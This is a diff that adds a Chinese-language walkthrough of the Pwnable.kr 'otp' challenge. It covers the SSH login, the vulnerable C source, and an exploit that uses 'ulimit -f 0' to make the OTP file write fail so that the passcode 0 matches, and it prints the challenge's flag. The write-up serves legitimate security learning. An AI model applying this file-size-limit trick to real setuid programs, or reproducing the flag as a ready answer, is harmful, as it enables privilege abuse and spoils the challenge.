@@ -13341,5 +13341,128 @@ control EBP, control ESP, control EIP, control the world~
 
 ------
 
+### otp
 
+这是**Pwnable.kr**的第二十五个挑战`otp`，来自**[Rookiss]**部分。
+
+```bash
+I made a skeleton interface for one time password authentication system.
+I guess there are no mistakes.
+could you take a look at it?
+
+hint : not a race condition. do not bruteforce.
+
+ssh otp@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh otp@pwnable.kr -p2222
+otp@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun 23 04:52:25 2023 from 121.18.90.141
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+otp@pwnable:~$ ls -la
+total 40
+drwxr-x---   5 root    otp  4096 Oct 23  2016 .
+drwxr-xr-x 117 root    root 4096 Nov 10  2022 ..
+d---------   2 root    root 4096 Jun 14  2014 .bash_history
+-r--r-----   1 otp_pwn root   65 Jun 14  2014 flag
+dr-xr-xr-x   2 root    root 4096 Aug 20  2014 .irssi
+-r-sr-x---   1 otp_pwn otp  9052 Jun 14  2014 otp
+-rw-r--r--   1 root    root  820 Jun 14  2014 otp.c
+drwxr-xr-x   2 root    root 4096 Oct 23  2016 .pwntools-cache
+```
+
+输入`cat otp.c`来查看`otp.c`的代码。程序会接收一个命令行参数`passcode`，接着从`/dev/urandow`伪随机设备里读取`16`个字节（`128`位）随机数据到数组`otp`中，前`8`个字节用作文件名，后`8`字节存写入该文件中，随后输出`"OTP generated."`。程序会使用`strtoul()`将`passcode`转换成`unsigned long long`型，并与生成的密码进行比较，如果相等就能执行`system("/bin/cat flag");`，否则输出`"OTP mismatch"`。简而言之，该程序会生成一个随机的`OTP`，将其存储在一个文件中，随后读取它并将其与用户提供的密码进行比较，如果密码匹配则执行`/bin/cat flag`命令显示`flag`中的内容。
+
+```c
+otp@pwnable:~$ cat otp.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+
+int main(int argc, char* argv[]){
+    char fname[128];
+    unsigned long long otp[2];
+
+    if(argc!=2){
+        printf("usage : ./otp [passcode]\n");
+        return 0;
+    }
+
+    int fd = open("/dev/urandom", O_RDONLY);
+    if(fd==-1) exit(-1);
+
+    if(read(fd, otp, 16)!=16) exit(-1);
+    close(fd);
+
+    sprintf(fname, "/tmp/%llu", otp[0]);
+    FILE* fp = fopen(fname, "w");
+    if(fp==NULL){ exit(-1); }
+    fwrite(&otp[1], 8, 1, fp);
+    fclose(fp);
+
+    printf("OTP generated.\n");
+
+    unsigned long long passcode=0;
+    FILE* fp2 = fopen(fname, "r");
+    if(fp2==NULL){ exit(-1); }
+    fread(&passcode, 8, 1, fp2);
+    fclose(fp2);
+
+    if(strtoul(argv[1], 0, 16) == passcode){
+        printf("Congratz!\n");
+        system("/bin/cat flag");
+    }
+    else{
+        printf("OTP mismatch\n");
+    }
+
+    unlink(fname);
+    return 0;
+}
+```
+
+使用`ulimit -f 0`来限制进程创建文件的大小为`0`，这样程序就无法将缓冲区中的内容就写入文件，那么最后读出来的自然也是`0`。
+
+```bash
+otp@pwnable:~$ ulimit -f 0
+# 直接这样不行
+otp@pwnable:~$ ./otp 0
+File size limit exceeded (core dumped)
+# 利用Python的os模块在进程中执行./otp 0可以
+otp@pwnable:~$ python -c "import os; os.system('./otp 0')"
+OTP generated.
+Congratz!
+Darn... I always forget to check the return value of fclose() :(
+# 利用subprocess模块在子进程中执行./otp 0也可以
+otp@pwnable:~$ python -c "import subprocess; proc = subprocess.Popen(['/home/otp/otp', '']); proc.wait()"
+# 通过将信号处理程序设置为忽略SIGXFSZ信号，该命令确保忽略./otp程序遇到的任何文件大小超过限制的错误(SIGXFSZ)，并且不会导致命令终止。
+otp@pwnable:~$ python -c "import os, signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); os.system('./otp 0')"
+```
+
+提交`Darn... I always forget to check the return value of fclose() :(`即可。
+
+------
 
